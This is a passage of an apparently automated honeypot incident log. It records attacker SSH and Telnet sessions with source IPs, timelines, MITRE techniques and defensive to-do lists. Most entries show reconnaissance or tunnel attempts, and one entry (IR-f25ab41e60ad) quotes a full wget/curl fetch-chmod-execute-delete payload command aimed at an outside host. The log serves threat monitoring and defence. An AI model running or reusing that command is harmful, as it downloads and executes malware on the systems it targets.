| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:58:32` | `cowrie.session.connect` |
| `2026-08-16 17:58:32` | `cowrie.client.version` |
| `2026-08-16 17:58:32` | `cowrie.client.kex` |
| `2026-08-16 17:58:34` | `cowrie.login.success` |
| `2026-08-16 17:58:36` | `cowrie.session.params` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.success` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:36` | `cowrie.command.input` |
| `2026-08-16 17:58:37` | `cowrie.log.closed` |
| `2026-08-16 17:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a6325d8f7d

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-08-16 17:58 |
| **Last Seen** | 2026-08-16 17:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:58:42` | `cowrie.session.connect` |
| `2026-08-16 17:58:43` | `cowrie.client.version` |
| `2026-08-16 17:58:43` | `cowrie.client.kex` |
| `2026-08-16 17:58:44` | `cowrie.login.success` |
| `2026-08-16 17:58:44` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b69570a43a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 17:58 |
| **Last Seen** | 2026-08-16 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:58:46` | `cowrie.session.connect` |
| `2026-08-16 17:58:46` | `cowrie.client.version` |
| `2026-08-16 17:58:46` | `cowrie.client.kex` |
| `2026-08-16 17:58:46` | `cowrie.login.success` |
| `2026-08-16 17:58:47` | `cowrie.session.params` |
| `2026-08-16 17:58:47` | `cowrie.command.input` |
| `2026-08-16 17:58:47` | `cowrie.log.closed` |
| `2026-08-16 17:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53742b91537a

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:58 |
| **Last Seen** | 2026-08-16 17:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:58:50` | `cowrie.session.connect` |
| `2026-08-16 17:58:50` | `cowrie.client.version` |
| `2026-08-16 17:58:51` | `cowrie.client.kex` |
| `2026-08-16 17:58:53` | `cowrie.login.success` |
| `2026-08-16 17:58:54` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:58:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:58:56` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b38779971f59

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:00 |
| **Last Seen** | 2026-08-16 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:00:44` | `cowrie.session.connect` |
| `2026-08-16 18:00:44` | `cowrie.client.version` |
| `2026-08-16 18:00:44` | `cowrie.client.kex` |
| `2026-08-16 18:00:45` | `cowrie.login.success` |
| `2026-08-16 18:00:46` | `cowrie.session.params` |
| `2026-08-16 18:00:46` | `cowrie.command.input` |
| `2026-08-16 18:00:46` | `cowrie.log.closed` |
| `2026-08-16 18:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55683453b1df

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:02 |
| **Last Seen** | 2026-08-16 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:02:39` | `cowrie.session.connect` |
| `2026-08-16 18:02:39` | `cowrie.client.version` |
| `2026-08-16 18:02:39` | `cowrie.client.kex` |
| `2026-08-16 18:02:39` | `cowrie.login.success` |
| `2026-08-16 18:02:40` | `cowrie.session.params` |
| `2026-08-16 18:02:40` | `cowrie.command.input` |
| `2026-08-16 18:02:40` | `cowrie.log.closed` |
| `2026-08-16 18:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-befc9cc9a122

| Field | Detail |
|---|---|
| **Source IP** | `117.191.83[.]250` |
| **First Seen** | 2026-08-16 18:02 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:02:53` | `cowrie.session.connect` |
| `2026-08-16 18:02:54` | `cowrie.client.version` |
| `2026-08-16 18:02:54` | `cowrie.client.kex` |
| `2026-08-16 18:02:57` | `cowrie.login.success` |
| `2026-08-16 18:02:58` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.191.83[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.191.83[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82fec364f96

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-08-16 18:03 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:03:03` | `cowrie.session.connect` |
| `2026-08-16 18:03:04` | `cowrie.client.version` |
| `2026-08-16 18:03:04` | `cowrie.client.kex` |
| `2026-08-16 18:03:06` | `cowrie.login.success` |
| `2026-08-16 18:03:07` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b228d12cfe

| Field | Detail |
|---|---|
| **Source IP** | `218.29.231[.]106` |
| **First Seen** | 2026-08-16 18:03 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:03:28` | `cowrie.session.connect` |
| `2026-08-16 18:03:29` | `cowrie.client.version` |
| `2026-08-16 18:03:29` | `cowrie.client.kex` |
| `2026-08-16 18:03:32` | `cowrie.login.success` |
| `2026-08-16 18:03:32` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.231[.]106` to AbuseIPDB if not already reported
- [ ] Block `218.29.231[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0967f9fcd40f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-16 18:03 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:03:38` | `cowrie.session.connect` |
| `2026-08-16 18:03:39` | `cowrie.client.version` |
| `2026-08-16 18:03:39` | `cowrie.client.kex` |
| `2026-08-16 18:03:42` | `cowrie.login.success` |
| `2026-08-16 18:03:42` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adaa1b919c79

| Field | Detail |
|---|---|
| **Source IP** | `196.190.41[.]137` |
| **First Seen** | 2026-08-16 18:03 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:03:41` | `cowrie.session.connect` |
| `2026-08-16 18:03:42` | `cowrie.client.version` |
| `2026-08-16 18:03:42` | `cowrie.client.kex` |
| `2026-08-16 18:03:43` | `cowrie.login.success` |
| `2026-08-16 18:03:44` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.41[.]137` to AbuseIPDB if not already reported
- [ ] Block `196.190.41[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62be296b3e80

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-08-16 18:03 |
| **Last Seen** | 2026-08-16 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:03:49` | `cowrie.session.connect` |
| `2026-08-16 18:03:50` | `cowrie.client.version` |
| `2026-08-16 18:03:50` | `cowrie.client.kex` |
| `2026-08-16 18:03:53` | `cowrie.login.success` |
| `2026-08-16 18:03:54` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40452df91fbe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:04 |
| **Last Seen** | 2026-08-16 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:04:36` | `cowrie.session.connect` |
| `2026-08-16 18:04:36` | `cowrie.client.version` |
| `2026-08-16 18:04:36` | `cowrie.client.kex` |
| `2026-08-16 18:04:36` | `cowrie.login.success` |
| `2026-08-16 18:04:37` | `cowrie.session.params` |
| `2026-08-16 18:04:37` | `cowrie.command.input` |
| `2026-08-16 18:04:37` | `cowrie.log.closed` |
| `2026-08-16 18:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25ab41e60ad

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-16 18:05 |
| **Last Seen** | 2026-08-16 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **Download Attempts** | hxxp://5.182.210[.]174/ok, hxxp://5.182.210[.]174/ok, hxxp://5.182.210[.]174/ok |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:05:50` | `cowrie.session.connect` |
| `2026-08-16 18:05:50` | `cowrie.telnet.option` |
| `2026-08-16 18:05:50` | `cowrie.login.success` |
| `2026-08-16 18:05:50` | `cowrie.session.params` |
| `2026-08-16 18:05:51` | `cowrie.telnet.option` |
| `2026-08-16 18:05:51` | `cowrie.telnet.option` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.failed` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.success` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.failed` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.success` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.failed` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.success` |
| `2026-08-16 18:05:51` | `cowrie.command.input` |
| `2026-08-16 18:05:51` | `cowrie.command.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download` |
| `2026-08-16 18:05:51` | `cowrie.session.file_download.failed` |
| `2026-08-16 18:05:53` | `cowrie.command.input` |
| `2026-08-16 18:05:53` | `cowrie.log.closed` |
| `2026-08-16 18:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ff432c06df

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 18:05 |
| **Last Seen** | 2026-08-16 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:05:54` | `cowrie.session.connect` |
| `2026-08-16 18:05:54` | `cowrie.client.version` |
| `2026-08-16 18:05:54` | `cowrie.client.kex` |
| `2026-08-16 18:05:55` | `cowrie.login.success` |
| `2026-08-16 18:05:56` | `cowrie.session.params` |
| `2026-08-16 18:05:56` | `cowrie.command.input` |
| `2026-08-16 18:05:56` | `cowrie.log.closed` |
| `2026-08-16 18:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ae6a42948e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:06 |
| **Last Seen** | 2026-08-16 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:06:27` | `cowrie.session.connect` |
| `2026-08-16 18:06:27` | `cowrie.client.version` |
| `2026-08-16 18:06:27` | `cowrie.client.kex` |
| `2026-08-16 18:06:27` | `cowrie.login.success` |
| `2026-08-16 18:06:28` | `cowrie.session.params` |
| `2026-08-16 18:06:28` | `cowrie.command.input` |
| `2026-08-16 18:06:28` | `cowrie.log.closed` |
| `2026-08-16 18:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca7f53919f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:08 |
| **Last Seen** | 2026-08-16 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:08:12` | `cowrie.session.connect` |
| `2026-08-16 18:08:12` | `cowrie.client.version` |
| `2026-08-16 18:08:12` | `cowrie.client.kex` |
| `2026-08-16 18:08:13` | `cowrie.login.success` |
| `2026-08-16 18:08:13` | `cowrie.session.params` |
| `2026-08-16 18:08:13` | `cowrie.command.input` |
| `2026-08-16 18:08:13` | `cowrie.log.closed` |
| `2026-08-16 18:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a69102064cf

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 18:09 |
| **Last Seen** | 2026-08-16 18:10 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:09:09` | `cowrie.session.connect` |
| `2026-08-16 18:09:16` | `cowrie.client.version` |
| `2026-08-16 18:09:16` | `cowrie.client.kex` |
| `2026-08-16 18:09:42` | `cowrie.login.success` |
| `2026-08-16 18:09:55` | `cowrie.session.params` |
| `2026-08-16 18:09:55` | `cowrie.command.input` |
| `2026-08-16 18:10:02` | `cowrie.log.closed` |
| `2026-08-16 18:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb93b41c2e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:10 |
| **Last Seen** | 2026-08-16 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:10:04` | `cowrie.session.connect` |
| `2026-08-16 18:10:04` | `cowrie.client.version` |
| `2026-08-16 18:10:04` | `cowrie.client.kex` |
| `2026-08-16 18:10:04` | `cowrie.login.success` |
| `2026-08-16 18:10:05` | `cowrie.session.params` |
| `2026-08-16 18:10:05` | `cowrie.command.input` |
| `2026-08-16 18:10:05` | `cowrie.log.closed` |
| `2026-08-16 18:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c865860a6f7

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 18:10 |
| **Last Seen** | 2026-08-16 18:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:10:39` | `cowrie.session.connect` |
| `2026-08-16 18:10:39` | `cowrie.client.version` |
| `2026-08-16 18:10:39` | `cowrie.client.kex` |
| `2026-08-16 18:10:40` | `cowrie.login.success` |
| `2026-08-16 18:10:41` | `cowrie.session.params` |
| `2026-08-16 18:10:41` | `cowrie.command.input` |
| `2026-08-16 18:10:41` | `cowrie.log.closed` |
| `2026-08-16 18:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe29ea94131

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:11 |
| **Last Seen** | 2026-08-16 18:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:11:59` | `cowrie.session.connect` |
| `2026-08-16 18:11:59` | `cowrie.client.version` |
| `2026-08-16 18:11:59` | `cowrie.client.kex` |
| `2026-08-16 18:11:59` | `cowrie.login.success` |
| `2026-08-16 18:12:00` | `cowrie.session.params` |
| `2026-08-16 18:12:00` | `cowrie.command.input` |
| `2026-08-16 18:12:00` | `cowrie.log.closed` |
| `2026-08-16 18:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b612d3245cb1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:13 |
| **Last Seen** | 2026-08-16 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:13:51` | `cowrie.session.connect` |
| `2026-08-16 18:13:51` | `cowrie.client.version` |
| `2026-08-16 18:13:52` | `cowrie.client.kex` |
| `2026-08-16 18:13:52` | `cowrie.login.success` |
| `2026-08-16 18:13:53` | `cowrie.session.params` |
| `2026-08-16 18:13:53` | `cowrie.command.input` |
| `2026-08-16 18:13:53` | `cowrie.log.closed` |
| `2026-08-16 18:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift
